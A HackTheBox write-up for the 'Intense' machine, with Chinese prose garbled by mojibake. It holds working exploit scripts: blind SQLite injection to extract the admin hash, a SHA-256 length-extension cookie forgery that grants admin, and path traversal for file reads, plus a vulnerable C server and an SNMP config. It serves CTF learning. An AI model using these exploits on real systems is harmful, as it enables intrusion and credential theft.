è‡ªå®šä¹‰æ’ä»¶ã€‚","categories":[],"tags":[{"name":"hackthebox","slug":"hackthebox","permalink":"https://www.bycsec.top/tags/hackthebox/"},{"name":"pentest","slug":"pentest","permalink":"https://www.bycsec.top/tags/pentest/"},{"name":"Java","slug":"Java","permalink":"https://www.bycsec.top/tags/Java/"}]},{"title":"hackthebox-Intense","slug":"hackthebox-Intense","date":"2020-07-22T10:40:50.000Z","updated":"2021-02-18T05:09:19.359Z","comments":true,"path":"2020/07/22/hackthebox-Intense/","link":"","permalink":"https://www.bycsec.top/2020/07/22/hackthebox-Intense/","excerpt":"çº ç»“äº†å¥½ä¹…è¦ä¸è¦å†™è¿™ç¯‡wp.æœ€åè¿˜æ˜¯æ‰“ç®—æŠŠæµç¨‹è¿‡ä¸€éå§ã€‚é¦–å…ˆè¿™å°é¶æœºæ²¡æ–™åˆ°çš„æ˜¯å¼€å¼€å¿ƒå¿ƒåšåˆ°rootéƒ¨åˆ†å‘ç°æ˜¯ä¸ªpwnä¸€è„¸æ‡µé€¼ã€‚æƒ³è‡ªå·±ä¸Šæ‰‹æœ€åå‘ç°è¿˜æ˜¯tcl,åªå¥½å»è¯·æ•™æœ‹å‹ã€‚æ‰€å¹¸æœ€åè¿˜æ˜¯æ‰“æˆäº†ã€‚å› æ­¤pwnéƒ¨åˆ†æˆ‘ä¸åšè§£é‡Š,ä¸»è¦æŠŠå‰é¢getshellæµç¨‹å†™ä¸€éã€‚","text":"çº ç»“äº†å¥½ä¹…è¦ä¸è¦å†™è¿™ç¯‡wp.æœ€åè¿˜æ˜¯æ‰“ç®—æŠŠæµç¨‹è¿‡ä¸€éå§ã€‚é¦–å…ˆè¿™å°é¶æœºæ²¡æ–™åˆ°çš„æ˜¯å¼€å¼€å¿ƒå¿ƒåšåˆ°rootéƒ¨åˆ†å‘ç°æ˜¯ä¸ªpwnä¸€è„¸æ‡µé€¼ã€‚æƒ³è‡ªå·±ä¸Šæ‰‹æœ€åå‘ç°è¿˜æ˜¯tcl,åªå¥½å»è¯·æ•™æœ‹å‹ã€‚æ‰€å¹¸æœ€åè¿˜æ˜¯æ‰“æˆäº†ã€‚å› æ­¤pwnéƒ¨åˆ†æˆ‘ä¸åšè§£é‡Š,ä¸»è¦æŠŠå‰é¢getshellæµç¨‹å†™ä¸€éã€‚ initial footholdç¬¬ä¸€éƒ¨åˆ†å…ˆæ˜¯nmapæ‰«æ,å‘ç°åªå¼€äº†22,80ç«¯å£ã€‚é‚£å°±ç›´æ¥ä»webä¸‹æ‰‹ã€‚ è®¿é—®åˆ°é¡µé¢åå‘ç°æ›´åŠ ç›´æ¥äº†ã€‚é¢˜ç›®ç»™äº†æˆ‘ä»¬å…³é”®ä¿¡æ¯è¯´ç½‘ç«™æ˜¯å¼€æºçš„,ä¸‹è½½src.zipç›´æ¥å¾—appæºç ã€‚é‚£å°±æ„‰å¿«çš„å®¡è®¡äº†ã€‚ ä¸»ä½“ä»£ç app.py 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384from flask import Flask, request, render_template, g, redirect, url_for,\\ make_responsefrom utils import get_db, get_session, get_user, try_login, query_db, badword_in_strfrom admin import adminimport sqlite3import lwtapp = Flask(__name__)app.register_blueprint(admin)@app.teardown_appcontextdef close_connection(exception): db = getattr(g, '_database', None) if db is not None: db.close()@app.route('/submit', methods=[\"GET\"])def submit(): session = get_session(request) if session: user = get_user(session[\"username\"], session[\"secret\"]) return render_template(\"submit.html\", page=\"submit\", user=user) return render_template(\"submit.html\", page=\"submit\")@app.route(\"/submitmessage\", methods=[\"POST\"])def submitmessage(): message = request.form.get(\"message\", '') if len(message) &gt; 140: return \"message too long\" if badword_in_str(message): return \"forbidden word in message\" # insert new message in DB try: query_db(\"insert into messages values ('%s')\" %message) except sqlite3.Error as e: return str(e) return \"OK\"@app.route(\"/login\", methods=[\"GET\"])def login(): return render_template(\"login.html\", page=\"login\")@app.route(\"/postlogin\", methods=[\"POST\"])def postlogin(): # return user's info if exists data = try_login(request.form) if data: resp = make_response(\"OK\") # create new cookie session to authenticate user session = lwt.create_session(data) print(session) cookie = lwt.create_cookie(session) resp.set_cookie(\"auth\", cookie) return resp return \"Login failed\"@app.route(\"/logout\")def logout(): resp = make_response(\"&lt;script&gt;document.location.href='/';&lt;/script&gt;\") resp.set_cookie(\"auth\", \"\", expires=0) return resp@app.route(\"/\")@app.route(\"/home\")def index(): session = get_session(request) if session and \"username\" in session: user = get_user(session[\"username\"], session[\"secret\"]) print(user) return render_template(\"home.html\", page=\"home\", user=user) return render_template(\"home.html\", page=\"home\")if __name__ == \"__main__\": app.run('0.0.0.0',5000) admin.py 123456789101112131415161718192021222324252627282930313233from flask import Blueprint, render_template, request, redirect, abortfrom utils import is_admin, admin_view_log, admin_list_logadmin = Blueprint('admin', __name__)@admin.route(\"/admin\")def admin_home(): if not is_admin(request): abort(403) return render_template(\"admin.html\")@admin.route(\"/admin/log/view\", methods=[\"POST\"])def view_log(): if not is_admin(request): abort(403) logfile = request.form.get(\"logfile\") if logfile: logcontent = admin_view_log(logfile) return logcontent return ''@admin.route(\"/admin/log/dir\", methods=[\"POST\"])def list_log(): if not is_admin(request): abort(403) logdir = request.form.get(\"logdir\") if logdir: logdir = admin_list_log(logdir) return str(logdir) return '' lwt.py 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061from hashlib import sha256from base64 import b64decode, b64encodefrom random import randrangeimport osSECRET = os.urandom(randrange(8, 15))class InvalidSignature(Exception): passdef sign(msg): \"\"\" Sign message with secret key \"\"\" return sha256(SECRET + msg).digest()def verif_signature(data, sig): \"\"\" Verify if the supplied signature is valid \"\"\" return sign(data) == sigdef parse_session(cookie): \"\"\" Parse cookie and return dict @cookie: \"key1=value1;key2=value2\" return &#123;\"key1\":\"value1\",\"key2\":\"value2\"&#125; \"\"\" b64_data, b64_sig = cookie.split('.') data = b64decode(b64_data) sig = b64decode(b64_sig) if not verif_signature(data, sig): raise InvalidSignature info = &#123;&#125; for group in data.split(b';'): try: if not group: continue key, val = group.split(b'=') info[key.decode()] = val except Exception: continue return infodef create_session(data): \"\"\" Create session based on dict @data: &#123;\"key1\":\"value1\",\"key2\":\"value2\"&#125; return \"key1=value1;key2=value2;\" \"\"\" session = \"\" for k, v in data.items(): session += f\"&#123;k&#125;=&#123;v&#125;;\" return session.encode()def create_cookie(session): cookie_sig = sign(session) print(cookie_sig) return b64encode(session) + b'.' + b64encode(cookie_sig) utils.py 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112import lwtimport sqlite3from hashlib import sha256from flask import gfrom os import listdir, pathimport datetimeDATABASE = \"database.db\"class User: def __str__(self): return \"User(username=%s,role=%d)\" % (self.username,self.role)def get_db(): db = getattr(g, '_database', None) if db is None: db = g._database = sqlite3.connect(DATABASE) return dbdef log_login(user): now = datetime.datetime.now() d = now.strftime(\"%Y-%m-%d\") with open(f\"logs/&#123;d&#125;.log\", 'a') as log: log.write(str(user) + ' logged\\n')def badword_in_str(data): data = data.lower() badwords = [\"rand\", \"system\", \"exec\", \"date\"] for badword in badwords: if badword in data: return True return Falsedef hash_password(password): \"\"\" Hash password with a secure hashing function \"\"\" return sha256(password.encode()).hexdigest()def query_db(query, args=(), one=False): cur = get_db().execute(query, args) rv = cur.fetchall() cur.close() return (rv[0] if rv else None) if one else rvdef get_user(username, secret): \"\"\" Returns User object if given username/secret exist in DB \"\"\" username = username.decode() secret = secret.decode() res = query_db(\"select role from users where username = ? and secret = ?\", (username, secret), one=True) if res: user = User() user.username = username user.role = res[0] log_login(user) return user return Nonedef try_login(form): \"\"\" Try to login with the submitted user info \"\"\" if not form: return None username = form[\"username\"] password = hash_password(form[\"password\"]) result = query_db(\"select count(*) from users where username = ? and secret = ?\", (username, password), one=True) if result and result[0]: return &#123;\"username\": username, \"secret\":password&#125; return Nonedef get_session(request): \"\"\" Get user session and parse it \"\"\" if not request.cookies: return if \"auth\" not in request.cookies: return cookie = request.cookies.get(\"auth\") try: info = lwt.parse_session(cookie) except lwt.InvalidSignature: return &#123;\"status\": -1, \"msg\": \"Invalid signature\"&#125; return infodef is_admin(request): session = get_session(request) if not session: return None if \"username\" not in session or \"secret\" not in session: return None user = get_user(session[\"username\"], session[\"secret\"]) return user.role == 1#### Logs functions ####def admin_view_log(filename): if not path.exists(f\"logs/&#123;filename&#125;\"): return f\"Can't find &#123;filename&#125;\" with open(f\"logs/&#123;filename&#125;\") as out: return out.read()def admin_list_log(logdir): if not path.exists(f\"logs/&#123;logdir&#125;\"): return f\"Can't find &#123;logdir&#125;\" return listdir(logdir) è¿™ä¸ªflaskæºç æ•´ä½“å®ç°äº†sqliteçš„æ•°æ®åº“æŸ¥è¯¢ã€‚åº“ä¸­æœ‰adminè´¦æˆ·ã€‚é€šè¿‡cookieæ¥åˆ¤æ–­admin.å¹¶ä¸”adminæœ‰è¯»æ–‡ä»¶è·Ÿåˆ—ç›®å½•çš„åŠŸèƒ½ã€‚ é¦–å…ˆä»utils.pyçœ‹èµ·ã€‚è¿™é‡Œçš„å‡½æ•°å…³äºsqliteæ‰§è¡Œéƒ¨åˆ†å‡åšäº†å ä½ç¬¦æŸ¥è¯¢ï¼Œæ‰€ä»¥ä¸å­˜åœ¨æ³¨å…¥é—®é¢˜ã€‚def badword_in_str(data)åšäº†å…³é”®å­—çš„ç­›é€‰ã€‚æˆ‘ä»¬å»åˆ°è°ƒç”¨å‡½æ•°çš„åœ°æ–¹,å¾ˆå®¹æ˜“å°±å‘ç°å¤„ç†çš„ä½ç½®/submitmessageå­˜åœ¨insert into å‹çš„sqlæ³¨å…¥ã€‚ æ³¨æ„æºç ä¸­è¿™é‡Œæ³¨å…¥çš„åœ°æ–¹è¿”å›å€¼æ˜¯ä¸¤ç§ï¼šâ€OKâ€æˆ–è€…æŠ¥é”™ã€‚å¾ˆå¿«å°±èƒ½ååº”è¿‡æ¥æ˜¯sqliteç›²æ³¨,å¹¶ä¸”æ˜¯ä½¿ç”¨æŠ¥é”™å‡½æ•°æ¥åŒºåˆ†å¸ƒå°”å€¼ã€‚ å…³äºsqliteçš„ç›²æ³¨,æ™®é€šçš„å¸ƒå°”ç›²æ³¨ä¸sqlæ³¨å…¥æ²¡ä»€ä¹ˆåŒºåˆ«ã€‚ä½†æ˜¯åœ¨sqlæ—¶é—´ç›²æ³¨çš„æƒ…å½¢ä¸‹å°±éœ€è¦å¦å¤–å¤„ç†ã€‚å› ä¸ºsqliteæ²¡æœ‰å»¶æ—¶å‡½æ•°,æ‰€ä»¥æƒ³è¦åŒºåˆ†åªèƒ½åˆ©ç”¨æŠ¥é”™ã€‚(è¿™ç‚¹åœ¨st98å¤§ä½¬å‡ºçš„sqlite_voting,å‰é˜µå­asisçš„adminpanelä¸­éƒ½å‡ºç°è¿‡) å¸¸ç”¨çš„æŠ¥é”™å‡½æ•°ä¹‹RANDOMBLOB()ä¸å¯ç”¨çš„è¯,è¿˜å¯ä»¥ç”¨abs,jsonç­‰å‡½æ•°ã€‚ è¿™é‡Œç”¨abså‡½æ•°ç®€å•æ„é€ ä¸€ä¸ªdemo 123insert into messages values(&#39;1&#39;) union select abs(-9223372036854775808);&#x3D;&gt;1&#39;) union select abs(case when (1&#x3D;1) then (-9223372036854775808) else 0 end) -- æœ‰ä¸ªå°ç»†èŠ‚éœ€è¦æ³¨æ„ã€‚ä¸çŸ¥é“æ˜¯ä¸æ˜¯insert intoè¯­å¥çš„é—®é¢˜,å¦‚æœæˆ‘ä»¬åˆ©ç”¨abs(-9223372036854775808)è¿™ä¸ªæ•´ä½“æ¥æ„é€ å¸ƒå°”å€¼çš„è¯ã€‚å½“è¯­å¥ä¸­å‡ºç°selectä¼šä¸€ç›´æŠ¥é”™ã€‚è€Œå¦‚æœæˆ‘ä»¬åˆ©ç”¨-9223372036854775808æ¥ä½œä¸ºçœŸå€¼çš„è¯åˆ™ä¸ä¼šå‡ºç°è¿™ä¸ªé—®é¢˜ã€‚ ç»¼ä¸Š,ä¸Šé¢è¿™éƒ¨åˆ†å¾ˆå¿«å°±èƒ½ç¼–å†™exp.æœ¬åœ°è·‘çš„è¯,å…ˆå†™ä¸ªsqlå› ä¸ºé¢˜ç›®æºç ä¸­å¾ˆæ˜ç¡®çš„å‡ºç°äº†å‡ ä¸ªåˆ—åï¼Œæ‰€ä»¥å¯ä»¥å¿«é€Ÿç¼–å†™å¹¶åˆ›å»ºæœ¬åœ°çš„db.è¿œç¨‹è·‘ 123456789101112131415161718192021import requestsimport stringURL =\"http://10.10.10.195\"flag = \"\"for i in range(1, 65): a=0 for j in string.printable: print(\"\\r\" + flag, flush=False, end='') payload = \"a') union select abs(case when (substr((select password from users limit 0,1),\" + str(i) + \",1)='\" + j + \"') then(-9223372036854775808) else 0 end )--\" data = &#123;'message': payload&#125; r = requests.post(URL + 'submitmessage', data=data) if 'overflow' in r.text: a=1 flag += j print(\"\\r\" + flag, flush=True, end='') break if a==0: breakprint(\"\\r\")return flag å¾—åˆ°hashf1fc12010c094016def791e1435ddfdcaeccf8250e36630c0bc93285c2971105 æ‹¿åˆ°hashåå°è¯•è§£æ—¶æœç„¶æ²¡æœ‰å¾—åˆ°æ˜æ–‡ã€‚çœ‹æ¥å¦æœ‰ç„æœºã€‚æ³¨æ„åˆ° lwt.pyä¸­ä¸€ä¸ªå¾ˆæ˜¾çœ¼çš„éƒ¨åˆ† 12345SECRET = os.urandom(randrange(8, 15))def sign(msg): \"\"\" Sign message with secret key \"\"\" return sha256(SECRET + msg).digest() è¿™é‡Œä½œä¸ºç›å€¼çš„SECRETå¤„äºhashç®—æ³•sha256çš„å‰ç«¯ã€‚è¿™è¯´æ˜æ˜¯å­˜åœ¨hashæ‰©å±•æ”»å‡»çš„ã€‚æˆ‘ä»¬ä»”ç»†çœ‹ä¸‹å…¶è°ƒç”¨ä½ç½®ã€‚ 123456789101112131415161718192021def parse_session(cookie): \"\"\" Parse cookie and return dict @cookie: \"key1=value1;key2=value2\" return &#123;\"key1\":\"value1\",\"key2\":\"value2\"&#125; \"\"\" b64_data, b64_sig = cookie.split('.') data = b64decode(b64_data) sig = b64decode(b64_sig) if not verif_signature(data, sig): raise InvalidSignature info = &#123;&#125; for group in data.split(b';'): try: if not group: continue key, val = group.split(b'=') info[key.decode()] = val except Exception: continue return info è¿™é‡Œå¯ä»¥å‘ç°ã€‚å®ƒå–cookieä¸­ç”±.åˆ†å‰²å¼€çš„ä¸¤éƒ¨åˆ†åˆ†åˆ«ä½œä¸ºdataä¸sign.å…¶ä¸­dataæ˜¯username=guest;secret=SHA256{guest}çš„base64æ•°æ®ã€‚ä»è¿™é‡Œçš„å–é”®å€¼è¿”å›infoçš„å‡½æ•°å¾ˆå¿«å°±èƒ½å‘ç°å­˜åœ¨å˜é‡è¦†ç›–ã€‚æ¯”å¦‚æˆ‘ä»¬åœ¨åŸå§‹æ•°æ®åæ·»åŠ username=admin;secret=xxxå°±èƒ½è¦†ç›–åŸå…ˆcookieä¸­usernameä¸secretçš„å€¼ã€‚è€Œè¿™æ­£æ˜¯hashé•¿åº¦æ‰©å±•æ”»å‡»èƒ½åšåˆ°çš„ï¼šåœ¨åŸæœ‰æ•°æ®ä¸Šæ·»åŠ æ–°çš„æ•°æ®ã€‚ é‚£ä¹ˆå›è¿‡å¤´æ¥çœ‹ä¸‹å®ƒæ˜¯å¦‚ä½•åˆ¤æ–­adminçš„ã€‚å‘ç°æœç„¶æ˜¯ä»cookieä¸­å–adminä¸secretä¸æ•°æ®åº“ä¸­çš„usernameä¸secretè¿›è¡Œæ¯”è¾ƒã€‚è¿”å›å…¶roleå€¼ã€‚ä¸º1å³admin. é‚£ä¹ˆæ¥ä¸‹æ¥å°±æ˜¯hashé•¿åº¦æ‰©å±•æ”»å‡»äº†,ç”±äºSECRETé•¿åº¦æœ‰èŒƒå›´,æ‰€ä»¥éœ€è¦å°èŒƒå›´å°è¯•ä¸€ä¸‹ã€‚å¹¶ä¸”ä½¿ç”¨hashpumpyæ·»åŠ æ•°æ®;username=admin;secret=f1fc12010c094016def791e1435ddfdcaeccf8250e36630c0bc93285c2971105;ä¹‹æ‰€ä»¥è¿˜è¦åŠ ä¸ªåˆ†å·æ˜¯å› ä¸ºæˆ‘ä»¬çš„é•¿åº¦æ‰©å±•æ”»å‡»ä¼šåœ¨åŸå§‹æ•°æ®åæ·»åŠ \\x00ä¹‹ç±»çš„æ•°æ®ã€‚è€Œparse_sessionå‡½æ•°æ˜¯æŒ‰åˆ†å·è¯†åˆ«é”®,å€¼çš„ã€‚éœ€è¦å¦åŠ ä¸€ä¸ªåˆ†å·é¿å…åé¢çš„usernameé”®åå¸¦ä¸Šå‰é¢çš„æ•°æ®ã€‚ å› ä¸ºè¦åšåˆ°åˆ—ç›®å½•ï¼Œè¯»æ–‡ä»¶ï¼Œè‚¯å®šå¾—é‡å¤è°ƒç”¨ã€‚äºæ˜¯æ‰“ç®—å°è¯•ä¸‹å†™å®Œæ•´çš„åˆ©ç”¨è„šæœ¬æ¥æ¨¡æ‹Ÿå‘½ä»¤è¡Œæ¨¡å¼,æ€»å½’æ˜¯å†™å‡ºæ¥äº†ã€‚è™½ç„¶æˆ‘è§‰å¾—æ•ˆæœä¸€èˆ¬èˆ¬,ä½†æ¯•ç«Ÿæ˜¯ç¬¬ä¸€æ¬¡å†™æ¯”è¾ƒå®Œæ•´çš„åˆ©ç”¨,å¿ƒé‡Œè¿˜æ˜¯æ¯”è¾ƒèˆ’é€‚çš„233. å› ä¸ºsqlæ³¨å…¥éƒ¨åˆ†æœ¬åœ°åªè¦10sä¸åˆ°ã€‚è¿œç¨‹è¦10åˆ†é’Ÿå¤šã€‚æ‰€ä»¥ç‰¹æ„åŠ äº†defaulté€‰é¡¹å¯ä»¥ç›´æ¥ä½¿ç”¨ç°æˆçš„ç”¨æˆ·åè·Ÿhash. 1python3 exp.py default 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128#!/usr/bin/python3import requestsimport stringfrom hashpumpy import hashpumpfrom base64 import b64decode, b64encodefrom cmd import Cmdimport sysimport warningswarnings.filterwarnings('ignore')URL='http://10.10.10.195/'guest_cred=\"\"admin_cookie=&#123;&#125;class terminal(Cmd): #prompt = \"[*] =&gt; \" prompt='\\033[1;31;40m[*]\\033[0m'+' =&gt; '+'\\033[0;34;40m /var/www/html/app&gt; \\033[0m' print(\"[*] prompting a shell(current directory /var/www/html/app)\") def default(self, line): command=line.split(' ') try: print(admin_command(command[0],command[1])) except: passdef get_admin_name(): print(\"[*] getting admin username:\") flag = \"\" for i in range(1, 10): a=0 for j in string.printable: print(\"\\r\" + flag, flush=False, end='') payload = \"a') union select abs(case when (substr((select username from users limit 0,1),\" + str(i) + \",1)='\" + j + \"') then(-9223372036854775808) else 0 end )--\" data = &#123;'message': payload&#125; r = requests.post(URL + 'submitmessage', data=data) if 'overflow' in r.text: a=1 flag += j print(\"\\r\" + flag, flush=True, end='') break if a==0: break print(\"\\r\") return flagdef get_admin_hash(): print(\"[*] getting admin hash:\"+\"\\r\") flag = \"\" for i in range(1, 64 + 1): a=0 for j in string.printable: print(\"\\r\" + flag, flush=False, end='') payload = \"a') union select abs(case when (substr((select secret from users limit 0,1),\" + str(i) + \",1)='\" + j + \"') then(-9223372036854775808) else 0 end )--\" data = &#123;'message': payload&#125; r = requests.post(URL + 'submitmessage', data=data) if 'overflow' in r.text: a=1 flag += j print(\"\\r\" + flag, flush=True, end='') break if a==0: break print(\"\\r\") return flagdef guest_login(): print(\"[*] login with guest:guest\"+\"\\r\") global guest_cred users=&#123;'username':\"guest\",\"password\":\"guest\"&#125; r=requests.post(URL+'postlogin',data=users) old_data,old_sig=r.cookies['auth'].split('.') guest_cred=b64decode(old_data).decode() return b64decode(old_sig).hex()def crafting_payload(): if DEFAULT!=True: #from scratch admin_name=get_admin_name() admin_hash=get_admin_hash() else: #default admin_name=\"admin\" admin_hash=\"f1fc12010c094016def791e1435ddfdcaeccf8250e36630c0bc93285c2971105\" old_sig = guest_login() old_data=guest_cred payload=';'+(\";\".join([\"username=\"+admin_name,\"secret=\"+admin_hash]))+\";\" new_sig=\"\" for length in range(8,15): res = hashpump(old_sig, old_data, payload,length) cookie=(b64encode(res[1])+b'.'+b64encode(bytes.fromhex(res[0]))).decode() if admin_login(cookie): print('[*] testing length '+str(length)+\" : \") print('[*] admin_cookie: '+ cookie) return cookie return \"[*] Failes getting proper cookie.\"def admin_login(cookie): cookies=&#123;\"auth\":cookie&#125; r=requests.get(URL+'admin',cookies=cookies) if r.status_code==403: return False else: return Truedef admin_command(option,command): if option not in ['dir','view']: return \"Only dir/view supported.\" elif option=='dir': r=requests.post(URL+'admin/log/dir',data=&#123;'logdir':command&#125;,cookies=admin_cookie) return r.text else: r = requests.post(URL + 'admin/log/view', data=&#123;'logfile': '../'+command&#125;,cookies=admin_cookie) return r.textif __name__=='__main__': if len(sys.argv)==2: if sys.argv[1]=='default': print(\"[*] use default username + password\") DEFAULT=True else: exit(\"[*] specify default flag\") else: DEFAULT=False admin_cookie['auth']=crafting_payload() terminal().cmdloop() æ•ˆæœå¦‚å›¾: å¤§è‡´åŠŸèƒ½:è·‘èµ·æ¥å°±èƒ½å¾—åˆ°adminè·Ÿhash;çˆ†ç ´å‡ºadminçš„cookie;æ”¯æŒå‡å‘½ä»¤è¡Œdirè·Ÿviewå‘½ä»¤åˆ†åˆ«ç”¨æ¥åˆ—ç›®å½•è·Ÿè¯»æ–‡ä»¶ã€‚ è¿™æ ·å°±èƒ½å¾ˆå¿«åœ¨/home/userä¸‹æ‰¾åˆ°user.txtè¯»å–äº†ã€‚ å°ç»“ä¸‹ã€‚è¿™ä¸€éƒ¨åˆ†æˆ‘è§‰å¾—éš¾åº¦ä¸€èˆ¬ã€‚æ‹¿åˆ°CTFä¸­å€’æ˜¯æŒºåˆé€‚çš„ã€‚ä¸è¿‡æˆ‘è§‰å¾—è¿™ä¸ªhashé•¿åº¦æ‰©å±•ä»¥åŠå‰é¢æ³¨å…¥æ—¶è¸©çš„ä¸èƒ½ç”¨å®Œæ•´çš„abs()çš„å‘ç®—æ˜¯ç»™è‡ªå·±ä¸€äº›æé†’ã€‚ privesc to shell æ¥ä¸‹æ¥è¿™ä¸€éƒ¨åˆ†æœ‰ç‚¹ç„å¦™ã€‚æ˜¾ç„¶æˆ‘ä»¬ç°åœ¨å·²ç»èƒ½è¯»æ–‡ä»¶è·Ÿåˆ—ç›®å½•äº†ã€‚ä½†æ˜¯å´æ²¡æœ‰ä¸€ä¸ªshell.è€Œåœ¨userçš„ç›®å½•ä¸‹ç›´æ¥ç»™äº†ä¸€ä¸ªcçš„æºç æç¤ºæˆ‘ä»¬ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160// gcc -Wall -pie -fPIE -fstack-protector-all -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro note_server.c -o note_server#include &lt;signal.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/socket.h&gt;#include &lt;netinet/in.h&gt;#include &lt;arpa/inet.h&gt;#define BUFFER_SIZE 1024void handle_client(int sock) &#123; char note[BUFFER_SIZE]; uint16_t index = 0; uint8_t cmd; // copy var uint8_t buf_size; uint16_t offset; uint8_t copy_size; while (1) &#123; // get command ID if (read(sock, &amp;cmd, 1) != 1) &#123; exit(1); &#125; switch(cmd) &#123; // write note case 1: if (read(sock, &amp;buf_size, 1) != 1) &#123; exit(1); &#125; // prevent user to write over the buffer if (index + buf_size &gt; BUFFER_SIZE) &#123; exit(1); &#125; // write note if (read(sock, &amp;note[index], buf_size) != buf_size) &#123; exit(1); &#125; index += buf_size; break; // copy part of note to the end of the note case 2: // get offset from user want to copy if (read(sock, &amp;offset, 2) != 2) &#123; exit(1); &#125; // sanity check: offset must be &gt; 0 and &lt; index if (offset &lt; 0 || offset &gt; index) &#123; exit(1); &#125; // get the size of the buffer we want to copy if (read(sock, &amp;copy_size, 1) != 1) &#123; exit(1); &#125; // prevent user to write over the buffer's note if (index &gt; BUFFER_SIZE) &#123; exit(1); &#125; // copy part of the buffer to the end memcpy(&amp;note[index], &amp;note[offset], copy_size); index += copy_size; break; // show note case 3: write(sock, note, index); return; &#125; &#125;&#125;int main( int argc, char *argv[] ) &#123; int sockfd, newsockfd, portno; unsigned int clilen; struct sockaddr_in serv_addr, cli_addr; int pid; /* ignore SIGCHLD, prevent zombies */ struct sigaction sigchld_action = &#123; .sa_handler = SIG_DFL, .sa_flags = SA_NOCLDWAIT &#125;; sigaction(SIGCHLD, &amp;sigchld_action, NULL); /* First call to socket() function */ sockfd = socket(AF_INET, SOCK_STREAM, 0); if (sockfd &lt; 0) &#123; perror(\"ERROR opening socket\"); exit(1); &#125; if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &amp;(int)&#123; 1 &#125;, sizeof(int)) &lt; 0) perror(\"setsockopt(SO_REUSEADDR) failed\"); /* Initialize socket structure */ bzero((char *) &amp;serv_addr, sizeof(serv_addr)); portno = 5001; serv_addr.sin_family = AF_INET; serv_addr.sin_addr.s_addr = inet_addr(\"127.0.0.1\"); serv_addr.sin_port = htons(portno); /* Now bind the host address using bind() call.*/ if (bind(sockfd, (struct sockaddr *) &amp;serv_addr, sizeof(serv_addr)) &lt; 0) &#123; perror(\"ERROR on binding\"); exit(1); &#125; listen(sockfd,5); clilen = sizeof(cli_addr); while (1) &#123; newsockfd = accept(sockfd, (struct sockaddr *) &amp;cli_addr, &amp;clilen); if (newsockfd &lt; 0) &#123; perror(\"ERROR on accept\"); exit(1); &#125; /* Create child process */ pid = fork(); if (pid &lt; 0) &#123; perror(\"ERROR on fork\"); exit(1); &#125; if (pid == 0) &#123; /* This is the client process */ close(sockfd); handle_client(newsockfd); exit(0); &#125; else &#123; close(newsockfd); &#125; &#125; /* end of while */&#125; è¿™ä¸‹æˆ‘æ˜¯çœŸæ‡µäº†ã€‚å› ä¸ºçœ‹èµ·æ¥å°±æ˜¯ä¸ªpwné¢˜ã€‚ä½†æ¯”pwnæ›´é‡è¦çš„æ˜¯,æºç ä¸­å¯ä»¥çœ‹å‡ºæ¥å®ƒè·‘åœ¨127.0.0.1 5001ä¸Šã€‚é‚£ä¹ˆæˆ‘ä»¬å¤–ç½‘æ˜¯è®¿é—®ä¸åˆ°çš„ã€‚è¿™é‡Œä¼¼ä¹éœ€è¦ä¸€ä¸ªshellæ¥è®¿é—®ã€‚ äºæ˜¯ç»§ç»­è¿›è¡Œä¿¡æ¯æ”¶é›†ã€‚é¦–å…ˆè¯»äº†ä¸‹/proc/net/tcp 1234567/proc/net/tcpsl local_address rem_address st tx_queue rx_queue tr tm-&gt;when retrnsmt uid timeout inode 0: 00000000:0050 00000000:0000 0A 00000000:00000000 00:00000000 00000000 0 0 27909 1 0000000000000000 100 0 0 10 0 1: 3500007F:0035 00000000:0000 0A 00000000:00000000 00:00000000 00000000 101 0 24101 1 0000000000000000 100 0 0 10 0 2: 00000000:0016 00000000:0000 0A 00000000:00000000 00:00000000 00000000 0 0 28936 1 0000000000000000 100 0 0 10 0 3: 0100007F:1389 00000000:0000 0A 00000000:00000000 00:00000000 00000000 0 0 25962 1 0000000000000000 100 0 0 10 0 4: C30A0A0A:0050 570E0A0A:B5EE 01 00000000:00000000 00:00000000 00000000 33 0 328478 1 0000000000000000 138 4 30 10 7 è¿™é‡Œ1389å¯¹åº”çš„æ˜¯5001çš„16è¿›åˆ¶ã€‚å¹¶ä¸”å…¶uidæ˜¯0ã€‚è¿™è¯´æ˜æ˜¯rootè¿è¡Œ,æ­£å¥½ç¬¦åˆæˆ‘ä»¬çš„è¦æ±‚ã€‚ æ¥ç€çªç„¶å‘ç°ä¸€ä¸ª/etc/snmp/snmpd.conf 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475agentAddress udp:161view systemonly included .1.3.6.1.2.1.1view systemonly included .1.3.6.1.2.1.25.1 rocommunity public default -V systemonly rwcommunity SuP3RPrivCom90################################################################################# SYSTEM INFORMATION## Note that setting these values here, results in the corresponding MIB objects being &#39;read-only&#39;# See snmpd.conf(5) for more detailssysLocation Sitting on the Dock of the BaysysContact Me &lt;user@intense.htb&gt; # Application + End-to-End layerssysServices 72## Process Monitoring# # At least one &#39;mountd&#39; processproc mountd # No more than 4 &#39;ntalkd&#39; processes - 0 is OKproc ntalkd 4 # At least one &#39;sendmail&#39; process, but no more than 10proc sendmail 10 1## Disk Monitoring# # 10MBs required on root disk, 5% free on &#x2F;var, 10% free on all other disksdisk &#x2F; 10000disk &#x2F;var 5%includeAllDisks 10%## System Load# # Unacceptable 1-, 5-, and 15-minute load averagesload 12 10 5################################################################################# ACTIVE MONITORING# # send SNMPv1 traps trapsink localhost public## Event MIB - automatically generate alerts# # Remember to activate the &#39;createUser&#39; lines aboveiquerySecName internalUserrouser internalUser # generate traps on UCD error conditionsdefaultMonitors yes # generate traps on linkUp&#x2F;DownlinkUpDownNotifications yes## Arbitrary extension commands# extend test1 &#x2F;bin&#x2F;echo Hello, world! extend-sh test2 echo Hello, world! ; echo Hi there ; exit 35 master agentx 